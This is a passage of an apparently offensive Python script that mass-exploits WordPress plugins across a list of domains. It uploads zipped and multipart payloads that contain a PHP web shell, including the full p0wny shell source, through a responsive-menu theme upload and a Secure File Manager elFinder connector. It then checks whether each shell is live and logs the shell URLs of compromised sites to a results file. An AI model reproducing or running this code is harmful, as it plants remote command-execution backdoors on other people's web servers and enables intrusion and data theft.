\xc4\xba\xae\xa2\xe7\r\x0b\x0e\xb5n[\xb4\xc8%+p\xe9\xa2h\xbf\x9d=$\x91sE\xff\xff\x91\x00\x0e\x1d\xd3H\x87\xcd\xbc\x87\x81M\xc5;l\xd0\xae\xdc\x19E\x01S0X\xc2\x9a\x9b\xe1\xcf\x95\xaa$\x87-Q\xa9\xf0\xed\xb2.\xb0\xc8\xc6\x0emx\xd1G>\t\xda5\x8d\x84\xc6I6X%\r\xe3.W\r\x12\xd0\x06\xaf\xd9\xe5QK\xa7A\xbbfsu\xa0\x93\x13\x9d\xd7Q3\xbel\x8fZ\xd1\x16\xdc\x98&y\x05:\xa5\xbe\xc3\x0f\x16\xc8\xd5\xf9\x87\x1f\t\xf5\xef\xdc(\xf0g\x18\x15 N\xb8\xd6H\x14\xe2\xc1\x1c\x069E\x1ai\xb0J\xe3\x11\x19\xc3\x14$\x1f\xdf\x92\x11\xc4\x9b[JC\x88\xa8\xf0{\x0c\x06V\x12\xaerJ\x98\xf0\x8aY[*\x17\xcb\xcf\xcc\xba\xa5\x1f\xe8\xdf\xe7(\xafv\"\xf4\xdb\xe3U\xd4\x16\xf9\x15\x16\xean\xcam\x8b\xd8\x0bx\x838\xf1\xd8Z\xf9\x89\x9e\x15\xc6*(\xa4\xa6O\xe1\x8c\xa9\x15\xbf[`\xd4\t\xc1m\x1et^\xbc\xabTr\xfa\x14\xcfY2t>;\xb3\xca^\xf3g\x06[\xe9\"}\xf2\xb1!\xc3\xcc'\xb9\xf1K\xe0\xfa\xec8\xa9\xa9p)\xf9\x99\x87\x8e\x95\xd0\xd3\x85\xc4k\xfe\xd8\xb0\xc4\x9c\xb2\xe7Q\xe5\xb9\xdbLaV\xbdU\xa9\x17\xad\x92_\xec\x8c;\xcb\x9bS#\x89\xdc\x99\xde4<\xeaO\x92);\x04\xe94\xc51\xc1\x11s\xfb\xb1K=\x87\xb81\xa1\xb0r<\x90v\x1f\x1d|\n\x19%I\x02t\x97\xd0\xa3\t-\x87\x8aU\xf0\x8a\xb8\xcb\x9d\x8a\xb0\xa4\x83\xa6\xac*\x0f@6\xb1\x9f\x996N\xb9:\xee\x91\xbd<S~F\x1aH\x94\x89W\xa3B\x01\xf7\xd7\xb9\xaf8\xebT\x1cv\xaa\x1e\x95Zaz\xaeh_wnj\x1ca\x13/eI\xcf<\xc2\x14\xf6g\x81^E\xb5\xdeG+\xf8\x94\xf1\x1a\x11\x85\xbd\x84Mu\x93\xc7\xd4\xaf\x9b\xbbf+/\xc9\xf6>\xbdN\xc0\xc2\xa2\xa2b\xb3\x86h~\x02K\x06_;w\xcb\xec*j\x13\x92\xe6O\xd9\xc9\x92r\x12\xc1\x0e\xcc\x85\x98J4\x05)\xc4\xc0\x1d\x8a\xe8+L\xb2?\x82o\x9f\x10\r\\M#]\xa2!\xf7\x8a\xf4\x08\xd1\xa4G\xe4\x88*\xf3Q6\x101\xac\x90\x83\x99\x00\x93\xf4^\xa6\xdb&{7Geq\xe5%B\xa9\xb4\xd5\xba\xc1\x8e\x93ZJ\xa0j[\xa7\x07J\xddL\x165\x06|\xd2\x15\xa8\x1a\"a\xe7:\xf8\xa96\xb0zd1 \x95\x80\x9a\x05\xc5\xac\x89\xb9\xd92\xc5W'\xb6()T\xc0\xf6\x11\x1e\x9d\xf1\x1d\x84\x13\xd8s\xfci\xd8\x11`\xa1\xe7\xbcCoX\rUf\xc9{\r\xc8*^&\x10\xb0!u\xa0zc\x1a\xd1q\xa3E\x1a\xe8\xf3]\xf9p+\xb0\x13\n\xfbQ\xd8\xd9Y\xb3#~H\xdc\xc2\xfc\x9fq\xb6)\xf6\xf4\xb6\rP@\xb9\xea\xc6\xe1\x96\xce\x10e\x08\xccKp\x07\xa8\xc8M2\x91\xb1\x12i\x00\xc3\x90L\x9dN]\x0f\xa6<\xc7TC\xc3\x06\xe1n\x8b\xa7\x9ce\xa4\x11\x9d\x05wt\x1d\xd2|\xc8H\x8f\xb9\xb7J\x95EV\x1aJw?\xe4g3[\xb3\xad\xf4\xe6\xf6f'\xad-q\x83\xe2\xffl\x0f\xcbq\xce\xef\xe0\xc7\x05$\xb5\x14RR\xbdaO-\x82\xfc\xad\xb2\xc5\xaa\x85\x13\xb5\x83\x1bS\x97\x9d\xfaNh\xf2\x8a\xf9hJv\xddR#\x86\x1a\xc9\x94\xfa\xfa\x8aZ\xd5\xbcK\x1f9\xb45\xb2(&\x0e\xa5!\xfdE[v\t\xbf\x1d\x82\xb8x\x88\xfa\x8cD\x18\x9f\xff[zY\xb5\xe6mb\x9f2\xe3\x8d\x97>\x99\xfb\xb7>\xc4\x04\x02S\x91\xb2r\x97C\t\x8d\xa2 \"\x81\xcd\xd6\x17\xa74\x89\xea\xb8Q\xb5}\xf1\xd9^5\x8bW>\xc7m\x1c\xf8\x17\xe0\x05\xa75\xfbkqq\xc6\xa7\x0b\xf2\x9e\xfb_\xe6zh\x93\xc0\xbbc\x1b\x93_\xa8\xad,-\xe0\x83n\x1f\xb1\x9b\tXA\x02Dxm\xeb\x03\xbf\xaaP\xa18\x0en\x04,\x12\xe3\r\x89\x94$\xd0 \x82\xac.\x80\xe0u\xee%\xe9\x06Y\x84}\xdd\xc0\x14\x8e\xef\x89\xc9\xe3\x1a\"\xdc\x9a=!F-0~\xbd\x8c\xcf`\xe5\xf9\xf8\xe1B\xafXX\x8a&\xae\xb6FZ\x97\x92.q\xc9\x0f4c\xa2\n\x9f\xcb%\xd1~\xab\xc8\x8e\xe2i\x00Yd\n\xaa\xaeI@G\x9a\xac\x99Z\xb6\xeb\xe9\x93\x83:\xa3\xb1\x01\tu2\xdc\x12\n\xb5\x96$V\xb4\xff\xf3_\xa6\x06\xab\xaf\x84\xe5Z\xfa-xh\xef\xdf\x00\x8c\xb6\t\xe4\x9eb7Q\xcee\x85\xc3j\xf2\xe5\x12^!d\xd7Kz\x03\rI\xa1N\x81\xec@\xeb3\xc2)\xdb\xd0$J\x83O\xb4\xcdl\xb8\x8aP\x156\x14\xda\xaf\xd23/\xf7*\xed\x86\xcf\x90\xe3\x17nR9[\xd8\x06q\x03\xe5\xa8+!x\xdb\n\x16\x02)F\xae\x8d\xf3\x9cm9(\"\xff\x8f\x9b&\x9d\xb9Jd\x04\xdb\xf0\x9ah\xc5\x01\x94\x0c\xadvzO\xcdI\x8bhO\xadYx\xa4\xa9\x8b)+\xd8c\x0e\xeb%\xebA\xfb\x1ct\x82\xa0\x1bV9\xf3:\xaaJ\xab\xd8\xfe\x8b\x03\xc9\xb9\x15\x84t\x91X\xbdzx\xeb\xe8\xb9\xfa\xb7j\x9a\xcaxre\xb5|\x95|C\xd6\x03?\xdd\x16\xfe\x81>\xe0\x86@\xa7\x98\x1e)+\xb5\xe2~#\x030n\xe9C\x95o\xf1[{\xe7x T\xb8\xb6\x97\xe3A\xae\xddn\xb9w\xe6k\xfcU \x0eR\xb6\x1d^QP\xd0\x14\xf19}\n\x17\x03\xcb\xe2\xbe\x845h\xf11\xac\x11\x18\x03I\xf1l\xa7\x8fE\xab\xfaL\xac0\xa4\xdd\xde\xaaX2\xf2\xe6\x95\x8bt\xc5\x90\xac\xbe\x92;\xac\xba.\xf0QS\x19\xc2GT\xfe\xe5u\xbf\x16^\xc1\xc7\x18fH\xbc\x8e\xf7\xaa|\x91\xf5}\xa65q:lk\xcf\xa2\xda\xc4\xda\xb7N\xfc\x1a\x86\xea%)0\xf0\xecY\xcd\xa4Q\xf0\x8bu\x98Ob\xf8\x13\xa6\xd0F\x05\xc3\xcfw\xdf\x8d\xdc\xe6K\xbb\xfc\xa7\xbbZ\xe3\xca\x1a5\xaa\x9d\x8c\x07\xdb0b\xdfgtlA\xaa\\'\\\xae\x9c\xbeu8\xdb\xacd_\x8c\xbex\xff\\y!&\xe7W\xe1<\x9e2\xd02\xd9\xf2\x89\xb7\xd2'7[\xd2\xe4\x14i\x1ey-\xd8\x19G\xd6,\x86\xfdp\xcd.I\xde`\xfdqN\xa3\x87K\x96\x81\xd4V\x02,\xc5\xf9}\x86\x0f\xf6#:\x02\xc12\x89\xe7d\x9c\x87u\xe5{\x0eU<{\xc2\x95v\xddt\xb4\xb8z\xf9=\xf0\x8f\x1f\xde\x9eB\x1e\x00\xfb\"p\x02\xb6NCZ\xdc\xc3<Y\xd1\xcfi^\x03\xd8M\xddf\xbe\xa2D^\x93\xce\x02O\xbcL\xf0T\x95\xc5\x94G\xa2\xb6\xee\xa7\xe9\x16\xf3\xcf?^\xbcI\x9205\xa4\x02\x03\xc0\x1a\xec\x0fc4\xbcN\x0f\xf9/3v\x12)W~\x04\x8ei\"\xd0\xbdQ\\\xb3\x07\x04\x9a\\\x8b\xbco/\x16\x8b6\xd8q\xd6\x06\xc4\\q\x8eJ\x12\xc6\x87\x8f\xfb\xca\x878\x814\x90\xd7\x93\n{^\xa5\x9e\xd0\xe48\x9a\x8d\xbd\xc4\xb1,\x1eC\x9e>\xe5\x0cC\xd3<\xe6'?\x9d\xda<!\x89T\xb7\xdf\x8b\xdaM\xb3\xfd\x1fb6\xc7~\xb8|\xf7\x93\x11\xe2\x1d\xc1\x05\xef\xbd\xa2\xf7\xaa\x02\x9a\xfc\xa43I\x971\xd69\x0f\x8c\xe0\xa9#n\xd4\xd7\xfa\xb2\x07n\xafk\xe7lS\xbf\x98\xe2\x9f\x88!\x97xp\x97\xd2\xeb\x12\xe6\xcd\x0c\xdb\xe7\xfb\xac\xa2\xbc\xc0\xfd\xc5w\xf4b<\xa8\xcf\xab\xb3\xa4>\xf0Y)H\xf6\x82\xca\xbc\x9au\xe0\x01\r\xfb^.\xc9\xc2\xf5\x9d`a\xb0\xf7\x8a\x8a\x01\xf5\xf8]N\x18&\xa0\x81\xd1\xcb\xb4U5]\xd8i\x8e\x15\x01XJ\xca\x10\xaf@\x91\xbf\xc7\x91-v\"\x8a\x03\x16v\xbc\xc8\x06\xc0\xb8\t?\xcc\xc1C\x9c\xcb\xf3\x8b\xf3\xd3+\xad\xca\xa8\xd5[[%\x85\xaf2\xc9\x8c$\xc8t^\x81{\xd3\x85\xbf\xb0\xaa\x15\x84\x13\xfaS\x96\xaa*6_\xd2\xb5\xab5\xdb8v\xc4U\xb5\x87[]\xcbZ\x87\x85\x03\xaa0\xad\xca\x17\xd5dj\x15$9\xff\xb1)\xdfi;6\xf9\x1f\x05\xf1\x17\xac[J\x88\x83\xd7\xf7\\\xa7'\xfe\x92-\t\xee\x18\xb2\x95Ug\xc6|\xbf\xc4^\x1e\x0b\xbb-,A\r\x87\xc3\xe2\x00\"\xf5\x89N\tf\xb8z\x19\xf2\x0eV6\xea\x8b\x82\xd0\x0e\x02@\xab\t\xdf\x83l\xf8\x907\x0e\xf9 \x13_\x06\xd8\xba$K\x06\xc3\xc2\x0b1\x07&\xcc\x94%\xfb\x9dG\xbc$\r\x18\xc5\xc0`\xf0\x00 \x01\x91)5.\xf1u\xf87\x86\x9e\x03s.\xa0K\x1f6\x011P2\x0c \xb6,\"^\x0e\x9b\x8c:\xfc? ?\x13\xf8\xcf\x14(y#\xc3\xb0d\xf2\x0cD;\xd009\xc7\x84\x10\x15b\x03\xa1`\x18|\xc2\x979\xc01L\xe8%4\xb6\x90\x1a~\x0f\x97\x08\x91\xb5\xc3\xebr\x08\x1c\x13\x86z\x89\x03\x8a\xaa\xc0\xa6\x8ag\x99R\xe3\xdf\xeb\x9e\x82\xf1\x8a\xbd&8O\xc1\xefLp\xbcBS\xde\xc3\xd8\xb9\x95\xca\x11\xf9\x05fX\xec{\xd2\xbc\x95\x06\x8aj\x8c\xb8\xa3\x98o\xec\x9f\x9c\x9c\x1c\x9b\x0c\x83\xda\xc5\xcb\xad\xacG\xdcJur$\xf9\x1f\xcb\xb1\x9f\x81\x0f9\x19\x1ef\xf6\xb4\xca*\x8dfn\xa8\x99\\\x93\xf4zl\xf2\x89\xbd\x03\xb3\x9d\xfd9\xe0\x00PK\x07\x08\xad;\xa6\xce\xde\x0f\x00\x00TB\x00\x00PK\x01\x02\x14\x03\x14\x00\x08\x00\x08\x00\xef\xbb\xb9R\xad;\xa6\xce\xde\x0f\x00\x00TB\x00\x00\t\x00 \x00\x00\x00\x00\x00\x00\x00\x00\x00\xb4\x81\x00\x00\x00\x00shell.phpUT\r\x00\x07\xb3l\xad`-\xe2\xe2`\xb3l\xad`ux\x0b\x00\x01\x04\xe8\x03\x00\x00\x04\xe8\x03\x00\x00PK\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00W\x00\x00\x005\x10\x00\x00\x00\x00\r\n-----------------------------12473561203192832341566500492--\r\n"
        session.post(exploit_url, headers=header, data=body, verify=False, timeout=20)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-content/uploads/rmp-menu/themes/shell.php'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #8 -->> {green}Exploited !")
            open('results/ShellsExploit.txt', 'a+').write(f"{shell}\n")
        else:print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #8 -->> {red}Failed Exploit !")
    except:pass
    
def WpEx11(domain):
    try:
        target_ip = domain
        target_port = "80"
        wp_path = "/wordpess/"
        username = "AXVTECH666"
        password = "AXVTECH666PASS@#"

        session = requests.Session()
        auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

        # Header:
        header = {
            'Host': target_ip,
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'http://' + target_ip,
            'Connection': 'close',
            'Upgrade-Insecure-Requests': '1'
        }

        # Body:
        body = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }

        # Authenticate:
        auth = session.post(auth_url, headers=header, data=body, verify=False, timeout=20)
        auth_header = auth.headers['Set-Cookie']

        check_nonce_url = "http://" + target_ip + ':' + target_port + wp_path + 'wp-admin/admin.php?page=sfm_file_manager'
        header = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://" + target_ip,
            "Connection": "close",
            "Upgrade-Insecure-Requests": "1"
        }
        nonce_text = session.get(check_nonce_url, headers=header, verify=False, timeout=10).text
        nonce_text = nonce_text[nonce_text.find('"sfmpNonceKey":') + 16:]
        wp_nonce = nonce_text[:nonce_text.find('"')]

        exploit_url = "http://" + target_ip + ':' + target_port + wp_path + "wp-content/plugins/secure-file-manager//vendor/elfinder/php/connector.minimal.php"
        exploit_headers = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Accept": "*/*",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "http://" + target_ip + wp_path + "p-admin/admin.php?page=sfm_file_manager",
            "Content-Type": "multipart/form-data; boundary=---------------------------331639371531181046941710326893",
            "Origin": target_ip,
            "Connection": "close"
        }
        exploit_data = "-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"reqid\"\r\n\r\n17a9cc356393\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"cmd\"\r\n\r\nupload\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"target\"\r\n\r\nl1_Lw\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"_wpnonce\"\r\n\r\n" + wp_nonce + "\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"upload[]\"; filename=\"shell.phtml\"\r\nContent-Type: application/octet-stream\r\n\r\n<?php\n\nfunction featureShell($cmd, $cwd) {\n    $stdout = array();\n\n    if (preg_match(\"/^\\s*cd\\s*$/\", $cmd)) {\n        // pass\n    } elseif (preg_match(\"/^\\s*cd\\s+(.+)\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        chdir($match[1]);\n    } elseif (preg_match(\"/^\\s*download\\s+[^\\s]+\\s*(2>&1)?$/\", $cmd)) {\n        chdir($cwd);\n        preg_match(\"/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?$/\", $cmd, $match);\n        return featureDownload($match[1]);\n    } else {\n        chdir($cwd);\n        exec($cmd, $stdout);\n    }\n\n    return array(\n        \"stdout\" => $stdout,\n        \"cwd\" => getcwd()\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => getcwd());\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => array('File not found / no read permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        return array(\n            'name' => basename($filePath),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => array('Invalid path / no write permission.'),\n            'cwd' => getcwd()\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => array('Done.'),\n            'cwd' => getcwd()\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n\n<html>\n\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n        <style>\n            html, body {\n                margin: 0;\n                padding: 0;\n                background: #333;\n                color: #eee;\n                font-family: monospace;\n            }\n\n            *::-webkit-scrollbar-track {\n                border-radius: 8px;\n                background-color: #353535;\n            }\n\n            *::-webkit-scrollbar {\n                width: 8px;\n                height: 8px;\n            }\n\n            *::-webkit-scrollbar-thumb {\n                border-radius: 8px;\n                -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,.3);\n                background-color: #bcbcbc;\n            }\n\n            #shell {\n                background: #222;\n                max-width: 800px;\n                margin: 50px auto 0 auto;\n                box-shadow: 0 0 5px rgba(0, 0, 0, .3);\n                font-size: 10pt;\n                display: flex;\n                flex-direction: column;\n                align-items: stretch;\n            }\n\n            #shell-content {\n                height: 500px;\n                overflow: auto;\n                padding: 5px;\n                white-space: pre-wrap;\n                flex-grow: 1;\n            }\n\n            #shell-logo {\n                font-weight: bold;\n                color: #FF4180;\n                text-align: center;\n            }\n\n            @media (max-width: 991px) {\n                #shell-logo {\n                    font-size: 6px;\n                    margin: -25px 0;\n                }\n\n                html, body, #shell {\n                    height: 100%;\n                    width: 100%;\n                    max-width: none;\n                }\n\n                #shell {\n                    margin-top: 0;\n                }\n            }\n\n            @media (max-width: 767px) {\n                #shell-input {\n                    flex-direction: column;\n                }\n            }\n\n            @media (max-width: 320px) {\n                #shell-logo {\n                    font-size: 5px;\n                }\n            }\n\n            .shell-prompt {\n                font-weight: bold;\n                color: #75DF0B;\n            }\n\n            .shell-prompt > span {\n                color: #1BC9E7;\n            }\n\n            #shell-input {\n                display: flex;\n                box-shadow: 0 -1px 0 rgba(0, 0, 0, .3);\n                border-top: rgba(255, 255, 255, .05) solid 1px;\n            }\n\n            #shell-input > label {\n                flex-grow: 0;\n                display: block;\n                padding: 0 5px;\n                height: 30px;\n                line-height: 30px;\n            }\n\n            #shell-input #shell-cmd {\n                height: 30px;\n                line-height: 30px;\n                border: none;\n                background: transparent;\n                color: #eee;\n                font-family: monospace;\n                font-size: 10pt;\n                width: 100%;\n                align-self: center;\n            }\n\n            #shell-input div {\n                flex-grow: 1;\n                align-items: stretch;\n            }\n\n            #shell-input input {\n                outline: none;\n            }\n        </style>\n\n        <script>\n            var CWD = null;\n            var commandHistory = [];\n            var historyPosition = 0;\n            var eShellCmdInput = null;\n            var eShellContent = null;\n\n            function _insertCommand(command) {\n                eShellContent.innerHTML += \"\\n\\n\";\n                eShellContent.innerHTML += '<span class=\\\"shell-prompt\\\">' + genPrompt(CWD) + '</span> ';\n                eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(response.name, response.file)\n                        } else {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(response.stdout.join(\"\\n\"));\n                            updateCwd(response.cwd);\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"\xe2\x80\xa6/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return \"p0wny@shell:<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = response.cwd;\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"mtime[]\"\r\n\r\n1621978291\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"upload_path[]\"\r\n\r\nl1_Lw\r\n-----------------------------331639371531181046941710326893\r\nContent-Disposition: form-data; name=\"dropWith\"\r\n\r\n0\r\n-----------------------------331639371531181046941710326893--\r\n"
        x = session.post(exploit_url, headers=exploit_headers, data=exploit_data, verify=False, timeout=20)
        shell = 'http://' + target_ip + ':' + target_port + wp_path + '/shell.phtml'
        check = requests.get(shell, headers=ua, timeout=10, verify=False).text
        if "<title>p0wny@shell:~#" in check:
            print(f"{blue}|- {white}http://{domain} {white}| {yellow}Wp-Exploit #11 -->> {green}Exploited !")
